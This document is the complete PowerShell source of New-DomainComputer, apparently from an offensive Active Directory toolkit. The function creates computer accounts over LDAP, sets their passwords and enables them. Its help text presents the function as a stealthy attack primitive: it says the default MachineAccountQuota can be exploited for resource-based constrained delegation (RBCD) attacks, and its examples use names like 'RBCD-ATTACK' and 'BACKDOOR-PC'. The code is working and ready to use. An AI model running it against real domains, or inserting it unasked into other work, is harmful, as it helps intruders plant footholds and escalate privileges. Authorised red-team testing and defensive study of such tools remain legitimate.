function New-DomainComputer {
<#
.SYNOPSIS
    Creates a new computer object in Active Directory.

.DESCRIPTION
    New-DomainComputer creates a new computer account in Active Directory via LDAP AddRequest/ModifyRequest.
    This function is designed for offensive security operations where native AD tools may not be available or stealthy operation is required.

    Uses $Script:LdapConnection (AddRequest) for object creation, unicodePwd (ModifyRequest) for
    password setting with DirectoryEntry fallback, and ModifyRequest for account enabling.

    By default, MachineAccountQuota allows all domain users to create up to 10 computer objects in the domain. This can be exploited for RBCD attacks or other scenarios.

.PARAMETER Name
    sAMAccountName for the new computer. Will automatically add $ suffix if not present.

.PARAMETER Password
    Password for the new computer account (plaintext).
    If not specified, a random 20-character complex password is generated.

.PARAMETER OrganizationalUnit
    DistinguishedName of the OU where the computer should be created.
    Default: CN=Computers,DC=domain,DC=com

.PARAMETER Description
    Description attribute for the computer account.

.PARAMETER Enabled
    Whether the account should be enabled after creation. Default: $true

.PARAMETER Domain
    Target domain (FQDN).

.PARAMETER Server
    Specific Domain Controller to target.

.PARAMETER Credential
    PSCredential object for authentication.

.EXAMPLE
    New-DomainComputer -Name "FAKE-PC01"
    Creates a new computer account with auto-generated password in default Computers container.

.EXAMPLE
    New-DomainComputer -Name "RBCD-ATTACK" -Password "P@ssw0rd123!" -OrganizationalUnit "OU=Workstations,DC=contoso,DC=com"
    Creates a computer in a specific OU with custom password (for RBCD attacks).

.EXAMPLE
    $comp = New-DomainComputer -Name "BACKDOOR-PC" -PassThru
    Write-Host "Computer created! Password: $($comp.Password)"
    Creates a computer and retrieves the auto-generated password via -PassThru.

.PARAMETER PassThru
    Returns a result object instead of only console output.
    Useful for scripting and automation.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true)]
        [Alias('ComputerName')]
        [string]$Name,

        [Parameter(Position=1, Mandatory=$false)]
        [Alias('ComputerPassword')]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [string]$OrganizationalUnit,

        [Parameter(Mandatory=$false)]
        [string]$Description,

        [Parameter(Mandatory=$false)]
        [bool]$Enabled = $true,

        # Connection parameters
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$PassThru
    )

    begin {
        Write-Log "[New-DomainComputer] Starting computer creation"
    }

    process {
        # Ensure LDAP connection at start of process block
        $ConnectionParams = @{}
        if ($Domain) { $ConnectionParams['Domain'] = $Domain }
        if ($Server) { $ConnectionParams['Server'] = $Server }
        if ($Credential) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "CreateComputer"
                    Computer = $Name
                    Success = $false
                    Message = "No LDAP connection available"
                }
            }
            return
        }

        try {
            Write-Log "[New-DomainComputer] Creating new computer: $Name"

            # Ensure name ends with $
            if (-not $Name.EndsWith('$')) {
                $Name = "$Name$"
                Write-Log "[New-DomainComputer] Added $ to computer name: $Name"
            }

            # Determine target OU
            if ($OrganizationalUnit) {
                $TargetOU = $OrganizationalUnit
            } else {
                # Use default Computers container
                $TargetOU = "CN=Computers,$($Script:LDAPContext.DomainDN)"
            }

            Write-Log "[New-DomainComputer] Target OU: $TargetOU"

            # Phase A: Create computer object via AddRequest (DISABLED)
            $ComputerNameWithoutDollar = $Name.TrimEnd('$')
            $ComputerDN = "CN=$ComputerNameWithoutDollar,$TargetOU"

            $AddRequest = New-Object System.DirectoryServices.Protocols.AddRequest
            $AddRequest.DistinguishedName = $ComputerDN

            # WORKSTATION_TRUST_ACCOUNT (0x1000=4096) + ACCOUNTDISABLE (0x0002=2) = 4098
            # Create DISABLED first, then set password, then enable
            $AddRequest.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "computer"))) | Out-Null
            $AddRequest.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("sAMAccountName", $Name))) | Out-Null
            $AddRequest.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userPrincipalName", "$Name@$($Script:LDAPContext.Domain)"))) | Out-Null
            $AddRequest.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("dNSHostName", "$ComputerNameWithoutDollar.$($Script:LDAPContext.Domain)"))) | Out-Null
            $AddRequest.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4098"))) | Out-Null

            if ($Description) {
                $AddRequest.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("description", $Description))) | Out-Null
            }

            $AddResponse = $Script:LdapConnection.SendRequest($AddRequest)
            if ($AddResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                throw "LDAP AddRequest failed: $($AddResponse.ResultCode) - $($AddResponse.ErrorMessage)"
            }
            Write-Log "[New-DomainComputer] Computer object created (disabled): $ComputerDN"

            # Phase B: Set password
            $PasswordToSet = $Password
            $PasswordGenerated = $false

            if (-not $PasswordToSet) {
                $PasswordToSet = New-SafePassword -Length 20
                $PasswordGenerated = $true
                Write-Log "[New-DomainComputer] Generated random password"
            }

            # Try unicodePwd via ModifyRequest (works over LDAPS and Kerberos-encrypted LDAP)
            $PasswordSet = $false
            try {
                $quotedPwd = '"' + $PasswordToSet + '"'
                $pwdBytes = [System.Text.Encoding]::Unicode.GetBytes($quotedPwd)

                $PwdModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $PwdModifyRequest.DistinguishedName = $ComputerDN

                $PwdMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $PwdMod.Name = "unicodePwd"
                $PwdMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                $PwdMod.Add($pwdBytes) | Out-Null

                $PwdModifyRequest.Modifications.Add($PwdMod) | Out-Null

                $PwdResponse = $Script:LdapConnection.SendRequest($PwdModifyRequest)
                if ($PwdResponse.ResultCode -eq [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    $PasswordSet = $true
                    Write-Log "[New-DomainComputer] Password set via unicodePwd ModifyRequest"
                }
            }
            catch {
                $primaryError = $_.Exception.Message
                Write-Log "[New-DomainComputer] unicodePwd failed (expected on non-encrypted LDAP): $primaryError"
            }

            # Fallback: DirectoryEntry SetPassword (ADSI) - works on both LDAP and LDAPS
            if (-not $PasswordSet) {
                # Warn if no credentials available for DirectoryEntry (Hash/Key/Cert auth has no PSCredential)
                if (-not $Credential -and -not $Script:LDAPCredential) {
                    Write-Warning "[New-DomainComputer] DirectoryEntry fallback uses current Windows user context, not the Kerberos-authenticated session identity. Password operation may fail or use wrong identity."
                }
                Write-Log "[New-DomainComputer] Falling back to DirectoryEntry SetPassword"
                $ComputerEntry = Get-AuthenticatedDirectoryEntry -DistinguishedName $ComputerDN -Credential $Credential
                if (-not $ComputerEntry) {
                    # Cleanup orphaned disabled object
                    try {
                        $DelReq = New-Object System.DirectoryServices.Protocols.DeleteRequest($ComputerDN)
                        $Script:LdapConnection.SendRequest($DelReq) | Out-Null
                        Write-Log "[New-DomainComputer] Cleaned up orphaned object"
                    } catch { }
                    throw "Failed to get DirectoryEntry for password setting"
                }
                try {
                    $ComputerEntry.Invoke("SetPassword", $PasswordToSet)
                    $ComputerEntry.CommitChanges()
                    $PasswordSet = $true
                    Write-Log "[New-DomainComputer] Password set via DirectoryEntry SetPassword"
                }
                catch {
                    # Cleanup orphaned disabled object
                    try {
                        $DelReq = New-Object System.DirectoryServices.Protocols.DeleteRequest($ComputerDN)
                        $Script:LdapConnection.SendRequest($DelReq) | Out-Null
                        Write-Log "[New-DomainComputer] Cleaned up orphaned object after password failure"
                    } catch { }
                    $errorMsg = "Failed to set password."
                    if ($primaryError) {
                        $errorMsg += " LDAP: $primaryError"
                    }
                    $errorMsg += " ADSI fallback: $_"
                    throw $errorMsg
                }
                finally {
                    if ($ComputerEntry) { $ComputerEntry.Dispose() }
                }
            }

            # Phase C: Enable account via ModifyRequest (password is now set)
            if ($Enabled) {
                $EnableRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $EnableRequest.DistinguishedName = $ComputerDN

                $EnableMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $EnableMod.Name = "userAccountControl"
                $EnableMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                $EnableMod.Add("4096") | Out-Null  # WORKSTATION_TRUST_ACCOUNT only (enabled)

                $EnableRequest.Modifications.Add($EnableMod) | Out-Null

                $EnableResponse = $Script:LdapConnection.SendRequest($EnableRequest)
                if ($EnableResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "Failed to enable account: $($EnableResponse.ResultCode) - $($EnableResponse.ErrorMessage)"
                }
                Write-Log "[New-DomainComputer] Account enabled"
            }

            # Return result object only if -PassThru is specified (no console output)
            if ($PassThru) {
                $Result = [PSCustomObject]@{
                    Operation = "CreateComputer"
                    Computer = $Name
                    DistinguishedName = $ComputerDN
                    DNSHostName = "$ComputerNameWithoutDollar.$($Script:LDAPContext.Domain)"
                    Enabled = $Enabled
                    Success = $true
                    Message = "Computer successfully created"
                }

                # Add password to result if it was generated
                if ($PasswordGenerated) {
                    $Result | Add-Member -NotePropertyName "Password" -NotePropertyValue $PasswordToSet
                }

                return $Result
            } else {
                # Console output (default behavior)
                Show-Line "Successfully created computer: $Name" -Class Hint
                Show-KeyValue "Distinguished Name:" $ComputerDN
                Show-KeyValue "DNS Hostname:" "$ComputerNameWithoutDollar.$($Script:LDAPContext.Domain)"
                Show-KeyValue "Enabled:" $Enabled

                if ($PasswordGenerated) {
                    Show-KeyValue "Password (SAVE THIS!):" $PasswordToSet -Class Finding
                } else {
                    Show-KeyValue "Password:" "[Custom password set]"
                }
            }
        }
        catch {
            Write-Error "[New-DomainComputer] Failed to create computer '$Name': $_"
            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "CreateComputer"
                    Computer = $Name
                    Success = $false
                    Message = $_.Exception.Message
                }
            }
        }
    }
}
